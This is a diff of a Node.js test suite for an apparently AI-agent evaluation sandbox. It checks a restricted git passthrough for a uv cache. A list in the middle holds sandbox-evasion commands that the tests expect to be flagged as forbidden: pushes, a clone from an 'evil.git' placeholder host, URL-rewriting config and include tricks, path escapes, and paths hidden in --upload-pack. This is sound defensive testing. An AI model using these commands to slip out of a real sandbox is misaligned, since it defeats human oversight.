@@ -1,4 +1,4 @@
-import { describe, it } from 'node:test';
+import { afterEach, beforeEach, describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import { spawnSync } from 'node:child_process';
 import {
@@ -15,11 +15,12 @@ import {
 } from 'node:fs';
 import net from 'node:net';
 import { tmpdir } from 'node:os';
-import { join, dirname } from 'node:path';
+import { basename, join, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { hashDir } from '../../../evals/lib/arm-cache.mjs';
 import {
   createTrialSandbox,
+  removeTrialSandbox,
   readOAuthToken,
   sandboxCommand,
   sandboxProfile,
@@ -207,6 +208,171 @@ describe('simulated remotes', () => {
     assert.deepEqual(r.metadata.sandbox.simulatedCalls, []);
     assert.equal(r.metadata.sandbox.forbiddenCalls.length, 2);
     assert.match(r.error, /forbidden/);
+  });
+});
+
+describe('uv cache git passthrough', () => {
+  const serena = 'https://github.com/oraios/serena';
+  const gitCache = join(root, 'evals', '.uv-cache', 'git-v1');
+  const made = [];
+
+  const savedWritable = process.env.EVAL_SANDBOX_WRITABLE;
+
+  beforeEach(() => {
+    mkdirSync(gitCache, { recursive: true });
+    process.env.EVAL_SANDBOX_WRITABLE = [savedWritable, gitCache].filter(Boolean).join(':');
+  });
+
+  afterEach(() => {
+    if (savedWritable === undefined) delete process.env.EVAL_SANDBOX_WRITABLE;
+    else process.env.EVAL_SANDBOX_WRITABLE = savedWritable;
+    for (const dir of made.splice(0)) rmSync(dir, { recursive: true, force: true });
+  });
+
+  function repo(dir, { commit = false } = {}) {
+    mkdirSync(dir, { recursive: true });
+    made.push(dir);
+    spawnSync('git', ['init', '-q', dir]);
+    if (commit) {
+      const id = {
+        GIT_AUTHOR_NAME: 't',
+        GIT_AUTHOR_EMAIL: 't@t',
+        GIT_COMMITTER_NAME: 't',
+        GIT_COMMITTER_EMAIL: 't@t',
+      };
+      spawnSync('git', ['-C', dir, 'commit', '-q', '--allow-empty', '-m', 'x'], {
+        env: { ...process.env, ...id },
+      });
+    }
+    return dir;
+  }
+
+  function cacheRepo() {
+    return repo(join(gitCache, `test-${process.pid}-${made.length}`));
+  }
+
+  function withFakeGit() {
+    const dir = join(h.base, 'fake-git-bin');
+    const log = join(gitCache, `fake-git-${process.pid}.log`);
+    made.push(log);
+    mkdirSync(dir, { recursive: true });
+    writeFileSync(
+      join(dir, 'git'),
+      `#!/bin/sh\n{ echo "ARGS $*"; env | sort | grep -E '^(GIT_|HTTPS_PROXY)'; } >> '${log}'\n`,
+      {
+        mode: 0o755,
+      }
+    );
+    const savedPath = process.env.PATH;
+    process.env.PATH = `${dir}:${savedPath}`;
+    return {
+      log: () => (existsSync(log) ? readFileSync(log, 'utf8') : ''),
+      restore: () => {
+        process.env.PATH = savedPath;
+      },
+    };
+  }
+
+  it('the Serena fetch inside the uv git cache reaches git with hooks, proxies and config scrubbed', async () => {
+    const dir = cacheRepo();
+    const fake = withFakeGit();
+    try {
+      h.useFakeClaude({
+        FAKE_CLAUDE_RUN: `cd '${dir}' && GIT_CONFIG_PARAMETERS="'url.x.insteadOf=${serena}'" GIT_DIR=/elsewhere git fetch --force --update-head-ok ${serena} +HEAD:refs/remotes/origin/HEAD`,
+      });
+      const r = await h.call({ trialId: 'u1', noCache: true });
+      assert.deepEqual(r.metadata.sandbox.forbiddenCalls, []);
+      const seen = fake.log();
+      assert.match(
+        seen,
+        /ARGS -c core\.hooksPath=\/dev\/null .*-c protocol\.allow=never .*fetch --force/
+      );
+      assert.match(seen, /GIT_CONFIG_GLOBAL=\/dev\/null/);
+      assert.doesNotMatch(seen, /GIT_CONFIG_PARAMETERS|GIT_DIR=/);
+    } finally {
+      fake.restore();
+    }
+  });
+
+  it('a local clone of a uv cache path runs real git', async () => {
+    const src = repo(join(gitCache, `test-${process.pid}-src`), { commit: true });
+    h.useFakeClaude({
+      FAKE_CLAUDE_RUN: `git clone --local --no-checkout '${src}' "$TMPDIR/checkout" && echo CLONED`,
+    });
+    const r = await h.call({ trialId: 'u3', noCache: true });
+    assert.deepEqual(r.metadata.sandbox.forbiddenCalls, []);
+    assert.match(r.output, /CLONED/);
+  });
+
+  const forbidden = {
+    'a push from inside the uv cache': 'cd "$C" && git push origin HEAD',
+    'git -C into the cache': 'git -C "$C" push origin HEAD',
+    'a Serena fetch from outside the uv cache': `git fetch ${serena}`,
+    'a Serena fetch from a lookalike dir outside the cache': `L="$TMPDIR/ws/.uv-cache/git-v1/evil"; mkdir -p "$L"; git init -q "$L"; cd "$L" && git fetch ${serena}`,
+    'a Serena fetch with a second remote': `cd "$C" && git fetch ${serena} https://example.com/evil.git`,
+    'a Serena fetch with -c config': `cd "$C" && git -c url.x.insteadOf=${serena} fetch ${serena}`,
+    'a Serena fetch from a cache repo whose config rewrites URLs': `cd "$C" && git config url.file:///x.insteadOf ${serena} && git fetch ${serena}`,
+    'a Serena fetch from a cache repo whose config includes a rewriting file': `cd "$C" && printf '[url "file:///x"]\\n insteadOf = ${serena}\\n' > "$TMPDIR/inc" && git config include.path "$TMPDIR/inc" && git fetch ${serena}`,
+    'a Serena fetch with a mixed-case InsteadOf key': `cd "$C" && git config url.file:///x.InsteadOf ${serena} && git fetch ${serena}`,
+    'a Serena fetch from inside the cache repo git dir': `git -C "$C" config url.file:///x.insteadOf ${serena}; cd "$C/.git" && git fetch ${serena}`,
+    'a clone whose cache path source climbs out with ..':
+      'git clone --local "$C/../../x" "$TMPDIR/x"',
+    'a Serena fetch whose refspec writes outside refs/remotes': `cd "$C" && git fetch ${serena} +refs/heads/x:refs/heads/y`,
+    'a Serena fetch from a cache repo with a URL-shaped remote section': `cd "$C" && git config remote.${serena}.url file:///x && git fetch ${serena}`,
+    'a clone whose destination is in the cache but whose source is not':
+      'git clone --local /somewhere/else "$C/copied"',
+    'a clone from a remote': 'git clone https://example.com/evil.git "$TMPDIR/x"',
+    'a clone hiding the cache path in --upload-pack':
+      'git clone --upload-pack=/x/.uv-cache/git-v1/up "$C" "$TMPDIR/x"',
+    'a clone hiding the cache path in --recurse-submodules':
+      'git clone --recurse-submodules=/x/.uv-cache/git-v1/ "$C" "$TMPDIR/x"',
+  };
+  for (const [name, cmd] of Object.entries(forbidden)) {
+    it(`${name} is still a forbidden call`, async () => {
+      const dir = cacheRepo();
+      h.useFakeClaude({ FAKE_CLAUDE_RUN: `C='${dir}'; ${cmd}; true` });
+      const r = await h.call({ trialId: 'uf', noCache: true });
+      assert.ok(r.metadata.sandbox.forbiddenCalls.length >= 1, r.output);
+    });
+  }
+
+  it(
+    'removeTrialSandbox deletes the trial root and its Claude tmp dirs, not a sibling',
+    darwinOnly,
+    () => {
+      const sb = createTrialSandbox('cleanup');
+      const base = `/private/tmp/claude-${process.getuid()}`;
+      const mine = join(base, `-slug-${basename(sb.root).replace(/[^A-Za-z0-9]/g, '-')}-workspace`);
+      const other = join(base, '-slug-cleanup-someone-else');
+      mkdirSync(mine, { recursive: true });
+      mkdirSync(other, { recursive: true });
+      try {
+        removeTrialSandbox(sb);
+        assert.equal(existsSync(sb.root), false);
+        assert.equal(existsSync(mine), false);
+        assert.equal(existsSync(other), true);
+      } finally {
+        rmSync(other, { recursive: true, force: true });
+      }
+    }
+  );
+
+  it('the profile lets this trial write its Claude tmp dir and no sibling', darwinOnly, () => {
+    const sb = createTrialSandbox('claudetmp');
+    const base = `/private/tmp/claude-${process.getuid()}`;
+    const mine = join(base, `-slug-${basename(sb.root)}-workspace`);
+    const other = join(base, '-slug-someone-else');
+    try {
+      for (const dir of [mine, other]) {
+        const { command, args } = sandboxCommand(sb, '/bin/sh', ['-c', `mkdir -p '${dir}'`]);
+        spawnSync(command, args);
+      }
+      assert.equal(existsSync(mine), true);
+      assert.equal(existsSync(other), false);
+    } finally {
+      rmSync(mine, { recursive: true, force: true });
+      rmSync(sb.root, { recursive: true, force: true });
+    }
   });
 });
 
